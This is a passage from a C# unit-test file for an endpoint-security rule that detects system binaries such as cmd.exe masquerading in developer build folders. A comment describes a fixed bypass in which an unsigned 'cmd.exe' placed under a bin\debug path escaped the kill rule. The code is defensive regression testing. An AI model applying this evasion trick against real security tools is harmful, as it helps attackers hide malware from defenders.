            // v2.8.1 hardening: the developer-build path exclusion (\bin\debug, \bin\release,
            // .nuget) was attacker-controllable - an unsigned "cmd.exe" dropped under any
            // "...\bin\debug\..." folder previously bypassed this Tier1 KILL entirely. The dev-env
            // skip now requires a valid Authenticode signature. This fixture path is a nonexistent
            // (unsigned) file, so the masquerade must now be caught. Genuine developer build output
            // is essentially never named after an OS system tool, so this does not FP on real dev work.
            var rule = new DllSideloadingDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "cmd.exe",
                ImagePath = @"C:\Users\Admin\source\repos\app\bin\debug\cmd.exe",
                CommandLine = "cmd.exe /c test",
                ProcessId = 1401
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal(DetectionTier.Tier1Behavioral, result!.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
        }

        [Fact]
        public void DllSideloadingRule_DoesNotFire_SystemPath()
        {
            var rule = new DllSideloadingDetectionRule();
            var pt = new ProcessTelemetry
            {
                ProcessName = "onedrive.exe",
                ImagePath = @"C:\Program Files\Microsoft OneDrive\onedrive.exe",
                CommandLine = "onedrive.exe /background",
                ProcessId = 1402
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.Null(result);
        }

        #endregion
    }
}
